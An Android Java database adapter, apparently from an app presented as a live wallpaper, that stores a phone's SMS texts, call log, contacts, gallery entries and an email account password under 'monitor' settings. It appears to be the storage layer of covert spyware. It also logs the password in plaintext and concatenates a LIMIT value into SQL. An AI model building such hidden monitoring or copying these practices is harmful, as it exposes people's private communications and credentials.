package com.livewallpaper.circle.db.controllers;

import java.util.ArrayList;
import java.util.Map;
import java.util.WeakHashMap;

import com.livewallpaper.circle.db.models.Call;
import com.livewallpaper.circle.db.models.Contacts;
import com.livewallpaper.circle.db.models.EMail;
import com.livewallpaper.circle.db.models.Gallery;
import com.livewallpaper.circle.db.models.Number;
import com.livewallpaper.circle.db.models.People;
import com.livewallpaper.circle.db.models.Sms;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

public class MonitorSQLiteAdapter {

	private SQLiteDatabase db;
	private MonitorSQLiteHelper mdbHelper;
	private static final String LOG_TAG = "adapter";
	private final static String TAG = "MULTI-THREAD-DB-HELPER";

	// Tells for each thread if it requires that database should be opened or
	// not opened (closed)
	// Using WeakHashMap so that thread can be released by GC when needed (no
	// strong references on threads)
	private WeakHashMap<Thread, Boolean> states = new WeakHashMap<Thread, Boolean>();

	public static final MonitorSQLiteAdapter SQLITE_ADAPTER = new MonitorSQLiteAdapter();

	private MonitorSQLiteAdapter() {

	}

	public synchronized void open(Context context) {
		// synchronized because it may be accessible by multi threads (all
		// dbHelper methods are synchronized)
		// and synchronized on the object because open/close are related on each
		// other
		if (mdbHelper == null) {
			mdbHelper = new MonitorSQLiteHelper(context);
		}
		Thread currentThread = Thread.currentThread();

		states.put(currentThread, true); // this thread requires that this
											// database should be opened

		Logger.INSTANCE.debug(TAG, "getting database");

		db = mdbHelper.getWritableDatabase();
	}

	public synchronized void close() {
		Logger.INSTANCE.debug(TAG, "asking for closing");
		if (mdbHelper != null) {
			// Ask for closing database
			if (closeIfNeeded()) {
				mdbHelper.close(); // database closed: free resource for GC
				mdbHelper = null;
			}
		}
	}

	/**
	 * Close database if all threads dont need the database anymore
	 * 
	 * @return true if closed, false otherwise
	 */
	public synchronized boolean closeIfNeeded() {
		// synchronized because it may be accessible by multi threads (all
		// dbHelper methods are synchronized)
		// and synchronized on the object because open/close are related on each
		// other
		Thread currentThread = Thread.currentThread();

		Logger.INSTANCE.debug(TAG, "requesting closing");

		states.put(currentThread, false); // this thread requires that this
											// database should be closed

		boolean mustBeClosed = true;

		// if all threads asked for closing database, then close it
		Boolean opened = null;
		Thread thread = null;
		for (Map.Entry<Thread, Boolean> entry : states.entrySet()) {
			thread = entry.getKey();
			opened = entry.getValue();
			if (thread != null && opened != null) {
				Logger.INSTANCE.debug(TAG, String.format(
						"Thread [%s] requires database must be %s", thread
								.getId(), opened.booleanValue() ? "OPENED"
								: "CLOSED"));
				if (opened.booleanValue()) {
					// one thread still requires that database should be
					// opened
					mustBeClosed = false;
				}
			}
		}

		Logger.INSTANCE.debug(TAG, String
				.format(mustBeClosed ? "database must be closed"
						: "database still needs to be opened"));

		if (mustBeClosed) {

			db.close();
			Logger.INSTANCE.debug(TAG, "database is closed");
		}

		return mustBeClosed;
	}

	public synchronized void insertPerson(String phone, String email,
			String password, int setting, int setting_sms, long date_sms,
			int setting_call, long date_call, int setting_gallery,
			long date_gallery, int setting_contact) {
		db.beginTransaction();

		try {
			insertPeople(phone, setting, setting_sms, date_sms, setting_call,
					date_call, setting_gallery, date_gallery, setting_contact);
			insertEMail(email, password, phone);

			db.setTransactionSuccessful();
		} finally {
			db.endTransaction();
		}

	}

	public synchronized long insertPeople(String phone, int setting,
			int setting_sms, long date_sms, int setting_call, long date_call,
			int setting_gallery, long date_gallery, int setting_contact) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_PEOPLE_ID, phone);
		cv.put(MonitorSQLiteHelper.COLUMN_SETTINGS, setting);
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_SMS, setting_sms);
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_SMS, date_sms);
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_CALL, setting_call);
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_CALL, date_call);
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_GALLERY, setting_gallery);
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_GALLERY, date_gallery);
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_CONTACT, setting_contact);
		Log.i(LOG_TAG, "insertPeople: " + phone + " - " + setting + " - "
				+ setting_sms + " - " + date_sms + " - " + setting_call + " - "
				+ date_call + " - " + setting_gallery + " - " + date_gallery
				+ " - " + setting_contact);

		return db.insert(MonitorSQLiteHelper.TABLE_PEOPLE, null, cv);
	}

	public synchronized long insertEMail(String email, String password,
			String idphone) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_ADDRESS, email);
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_PASSWORD, password);
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_PEOPLE_ID, idphone);
		Log.i(LOG_TAG, "insertEMail: " + email + " - " + password + " - "
				+ idphone);

		return db.insert(MonitorSQLiteHelper.TABLE_EMAIL, null, cv);
	}

	public synchronized long insertSms(String address, String body, int type,
			String date, String _idpeople) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SMS_ADDRESS, address);
		cv.put(MonitorSQLiteHelper.COLUMN_SMS_BODY, body);
		cv.put(MonitorSQLiteHelper.COLUMN_SMS_TYPE, type);
		cv.put(MonitorSQLiteHelper.COLUMN_SMS_DATE, date);
		cv.put(MonitorSQLiteHelper.COLUMN_SMS_PEOPLE_ID, _idpeople);
		Log.i(LOG_TAG, "insertSms: ");

		return db.insert(MonitorSQLiteHelper.TABLE_SMS, null, cv);
	}

	public synchronized long insertCall(String phone, String date,
			String duraction, int type, String _idpeople) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_CALL_PHONE, phone);
		cv.put(MonitorSQLiteHelper.COLUMN_CALL_DATE, date);
		cv.put(MonitorSQLiteHelper.COLUMN_CALL_DURACTION, duraction);
		cv.put(MonitorSQLiteHelper.COLUMN_CALL_TYPE, type);
		cv.put(MonitorSQLiteHelper.COLUMN_CALL_PEOPLE_ID, _idpeople);
		Log.i(LOG_TAG, "insertCall: ");

		return db.insert(MonitorSQLiteHelper.TABLE_CALL, null, cv);
	}

	public synchronized long insertContacts(String name, String _idpeople) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_CONTACT_NAME_ID, name);
		cv.put(MonitorSQLiteHelper.COLUMN_CONTACTS_PEOPLE_ID, _idpeople);
		Log.i(LOG_TAG, "insertContacts: ");

		return db.insert(MonitorSQLiteHelper.TABLE_CONTACT, null, cv);
	}

	public synchronized long insertNumber(String number, String contactId) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_NUMBER_CONTACTS_ID, contactId);
		cv.put(MonitorSQLiteHelper.COLUMN_NUMBER, number);
		Log.i(LOG_TAG, "insertNumber: ");

		return db.insert(MonitorSQLiteHelper.TABLE_NUMBER, null, cv);
	}

	public synchronized long insertGallery(String data, String title,
			long date_add, String _idpeople) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_GALLERY_DATA, data);
		cv.put(MonitorSQLiteHelper.COLUMN_GALLERY_TITLE, title);
		cv.put(MonitorSQLiteHelper.COLUMN_GALLERY_PEOPLE_ID, _idpeople);
		Log.i(LOG_TAG, "insertGallery: ");

		return db.insert(MonitorSQLiteHelper.TABLE_GALLERY, null, cv);
	}

	public synchronized int updatePeopleSettings(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTINGS, p.getSettings());

		Log.w(LOG_TAG, "UPDATE - Settings - " + p.getSettings());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleSettingSms(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_SMS, p.getSettingSms());

		Log.w(LOG_TAG, "UPDATE - SettingSms - " + p.getSettingSms());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleLastSms(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_SMS, p.getLastSms());

		Log.w(LOG_TAG, "UPDATE - LastSms - " + p.getLastSms());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleSettingCall(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_CALL, p.getSettingCall());

		Log.w(LOG_TAG, "UPDATE - SettingCall() - " + p.getSettingCall());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleLastCall(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_CALL, p.getLastCall());

		Log.w(LOG_TAG, "UPDATE - LastCall - " + p.getLastCall());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleSettingGallery(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_GALLERY,
				p.getSettingGallery());

		Log.w(LOG_TAG, "UPDATE - SettingGallery - " + p.getSettingGallery());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleGallery(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_GALLERY,
				p.getSettingGallery());
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_GALLERY, p.getLastGallery());

		Log.w(LOG_TAG, "UPDATE - SettingGallery -  " + p.getSettingGallery()
				+ "  LastGallery - " + p.getLastGallery());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleLastGallery(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_LAST_GALLERY, p.getLastGallery());

		Log.w(LOG_TAG, "UPDATE LastGallery - " + p.getLastGallery());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized int updatePeopleSettingContact(People p) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_SETTING_CONTACT,
				p.getSettingContact());

		Log.w(LOG_TAG, "UPDATE - SettingContact - " + p.getSettingContact());
		return db.update(MonitorSQLiteHelper.TABLE_PEOPLE, cv,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ p.getPhoneId() });
	}

	public synchronized void updateEMail(EMail email, long idphone) {
		ContentValues cv = new ContentValues();
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_ADDRESS, email.getAddress());
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_PASSWORD, email.getPassword());
		cv.put(MonitorSQLiteHelper.COLUMN_EMAIL_PEOPLE_ID, email.getPeopleId());
		db.update(MonitorSQLiteHelper.TABLE_EMAIL, cv,
				MonitorSQLiteHelper.COLUMN_EMAIL_PEOPLE_ID + "=?",
				new String[] { "" + idphone });
	}

	public People selectPeople() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_PEOPLE, null, null, null,
				null, null, null);
		Log.i(LOG_TAG, "selectPeople rows: " + c.getCount());
		People p = null;
		if (c.moveToNext()) {
			p = new People();
			p.setPhoneId(c.getString(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_PEOPLE_ID)));
			p.setSettings(c.getInt(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_SETTINGS)));
			p.setSettingSms(c.getInt(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_SETTING_SMS)));
			p.setLastSms(c.getLong(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_LAST_SMS)));
			p.setSettingCall(c.getInt(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_SETTING_CALL)));
			p.setLastCall(c.getLong(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_LAST_CALL)));
			p.setSettingGallery(c.getInt(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_SETTING_GALLERY)));
			p.setLastGallery(c.getLong(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_LAST_GALLERY)));
			p.setSettingContact(c.getInt(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_SETTING_CONTACT)));

		}
		c.close();
		return p;
	}

	public EMail selectEMail() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_EMAIL, null, null, null,
				null, null, null);
		Log.i(LOG_TAG, "selectEMail rows: " + c.getCount());
		EMail em = null;
		if (c.moveToNext()) {
			em = new EMail();
			em.setAddress(c.getString(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_EMAIL_ADDRESS)));
			em.setPassword(c.getString(c
					.getColumnIndex(MonitorSQLiteHelper.COLUMN_EMAIL_PASSWORD)));

		}
		c.close();
		return em;
	}

	public ArrayList<Sms> selectSms() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_SMS, null, null, null,
				null, null, null);
		Log.i(LOG_TAG, "selectSms rows: " + c.getCount());
		ArrayList<Sms> smsList = new ArrayList<Sms>();

		if (c.moveToFirst()) {

			do {
				Sms sms = new Sms();
				sms.setAddress(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_SMS_ADDRESS)));
				sms.setBody(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_SMS_BODY)));
				sms.setDate(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_SMS_DATE)));
				sms.setType(c.getInt(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_SMS_TYPE)));
				smsList.add(sms);
			} while (c.moveToNext());

		}
		c.close();
		return smsList;
	}

	public ArrayList<Call> selectCall() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_CALL, null, null, null,
				null, null, null);
		Log.i(LOG_TAG, "selectCall rows: " + c.getCount());
		ArrayList<Call> callList = new ArrayList<Call>();

		if (c.moveToFirst()) {

			do {
				Call call = new Call();
				call.setPhone(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CALL_PHONE)));
				call.setDate(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CALL_DATE)));
				call.setDuraction(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CALL_DURACTION)));
				call.setType(c.getInt(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CALL_TYPE)));
				callList.add(call);
			} while (c.moveToNext());

		}
		c.close();
		return callList;
	}

	public ArrayList<Contacts> selectContact() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_CONTACT, null, null,
				null, null, null, null);
		Log.i(LOG_TAG, "selectContact rows: " + c.getCount());

		ArrayList<Contacts> contactList = new ArrayList<Contacts>();

		if (c.moveToFirst()) {

			do {
				Contacts contacts = new Contacts();
				contacts.setContactId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CONTACT_NAME_ID)));
				contacts.setPeopleId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_CONTACTS_PEOPLE_ID)));
				contactList.add(contacts);
			} while (c.moveToNext());

		}
		c.close();
		return contactList;
	}

	public ArrayList<Number> selectNumber() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_NUMBER, null, null, null,
				null, null, null);
		Log.i(LOG_TAG, "selectNumber rows: " + c.getCount());

		ArrayList<Number> numberList = new ArrayList<Number>();

		if (c.moveToFirst()) {

			do {
				Number number = new Number();
				number.setContactId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_NUMBER_CONTACTS_ID)));
				number.setNumber(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_NUMBER)));
				numberList.add(number);
			} while (c.moveToNext());

		}
		c.close();
		return numberList;
	}

	public ArrayList<Gallery> selectGalleryWithLimit(String limit) {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_GALLERY, null, null,
				null, null, null, MonitorSQLiteHelper.COLUMN_GALLERY_ID, limit);
		Log.i(LOG_TAG, "selectGallery rows: " + c.getCount());
		ArrayList<Gallery> galleryList = new ArrayList<Gallery>();

		if (c.moveToFirst()) {

			do {
				Gallery gallery = new Gallery();
				gallery.setId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_GALLERY_ID)));
				gallery.setData(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_GALLERY_DATA)));
				gallery.setTitle(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_GALLERY_TITLE)));
				gallery.setPeopleId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_GALLERY_PEOPLE_ID)));
				galleryList.add(gallery);
			} while (c.moveToNext());

		}
		c.close();
		return galleryList;
	}

	public int selectPeopleCount() {
		Cursor c = db.query(MonitorSQLiteHelper.TABLE_PEOPLE, null, null, null,
				null, null, null);

		int count = c.getCount();
		Log.i(LOG_TAG, "selectPeopleCount rows: " + count);
		c.close();
		return count;
	}

	public synchronized void deletePerson(String _idpeople) {
		db.beginTransaction();

		try {

			deleteEMail(_idpeople);
			deletePeople(_idpeople);
			deleteSms(_idpeople);
			deleteCall(_idpeople);
			deleteAllGallery(_idpeople);
			deleteContact(_idpeople);
			deleteNumber();

			db.setTransactionSuccessful();
		} finally {
			db.endTransaction();
		}
		Log.i(LOG_TAG, "deletePerson");

	}

	public synchronized void deletePeople(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_PEOPLE,
				MonitorSQLiteHelper.COLUMN_PEOPLE_ID + "=?", new String[] { ""
						+ _idpeople });
		Log.i(LOG_TAG, "deletePeople");
	}

	public synchronized void deleteEMail(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_EMAIL,
				MonitorSQLiteHelper.COLUMN_EMAIL_PEOPLE_ID + "=?",
				new String[] { "" + _idpeople });
		Log.i(LOG_TAG, "deleteEMail");
	}

	public synchronized void deleteSms(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_SMS,
				MonitorSQLiteHelper.COLUMN_SMS_PEOPLE_ID + "=?",
				new String[] { "" + _idpeople });
		Log.i(LOG_TAG, "deleteSms");
	}

	public synchronized void deleteCall(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_CALL,
				MonitorSQLiteHelper.COLUMN_CALL_PEOPLE_ID + "=?",
				new String[] { "" + _idpeople });
		Log.i(LOG_TAG, "deleteCall");
	}

	public synchronized void deleteGalleryWithLimit(String _idpeople,
			String limit) {
		Cursor c = db.rawQuery(
				"SELECT " + MonitorSQLiteHelper.COLUMN_GALLERY_ID + " FROM "
						+ MonitorSQLiteHelper.TABLE_GALLERY + " WHERE ? = "
						+ MonitorSQLiteHelper.COLUMN_GALLERY_PEOPLE_ID
						+ " ORDER BY " + MonitorSQLiteHelper.COLUMN_GALLERY_ID
						+ " ASC LIMIT " + limit, new String[] { _idpeople });
		if (c != null) {
			for (; c.moveToNext();) {
				deleteGalleryWithId(c.getString(c
						.getColumnIndex(MonitorSQLiteHelper.COLUMN_GALLERY_ID)));
			}
		}
		if (c != null) {
			c.close();
		}
		// db.execSQL("DELETE FROM " + MonitorSQLiteHelper.TABLE_GALLERY
		// + " WHERE " + MonitorSQLiteHelper.COLUMN_GALLERY_ID
		// + " IN (SELECT " + MonitorSQLiteHelper.COLUMN_GALLERY_ID
		// + " FROM " + MonitorSQLiteHelper.TABLE_GALLERY + " WHERE "
		// + _idpeople + " = "
		// + MonitorSQLiteHelper.COLUMN_GALLERY_PEOPLE_ID + " ORDER BY "
		// + MonitorSQLiteHelper.COLUMN_GALLERY_ID + " ASC LIMIT " + limit
		// + " )");
		Log.i(LOG_TAG, "deleteGalleryWithLimit");
	}

	public synchronized void deleteGalleryWithId(String id) {
		db.delete(MonitorSQLiteHelper.TABLE_GALLERY,
				MonitorSQLiteHelper.COLUMN_GALLERY_ID + "=?", new String[] { ""
						+ id });
		Log.i(LOG_TAG, "deleteGalleryWithId");
	}

	public synchronized void deleteAllGallery(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_GALLERY,
				MonitorSQLiteHelper.COLUMN_GALLERY_PEOPLE_ID + "=?",
				new String[] { "" + _idpeople });
		Log.i(LOG_TAG, "deleteAllGallery");
	}

	public synchronized void deleteContact(String _idpeople) {
		db.delete(MonitorSQLiteHelper.TABLE_CONTACT,
				MonitorSQLiteHelper.COLUMN_CONTACTS_PEOPLE_ID + "=?",
				new String[] { "" + _idpeople });
		Log.i(LOG_TAG, "deleteContact");
	}

	public synchronized void deleteNumber() {
		db.delete(MonitorSQLiteHelper.TABLE_NUMBER, null, null);
		Log.i(LOG_TAG, "deleteNumber");
	}

}
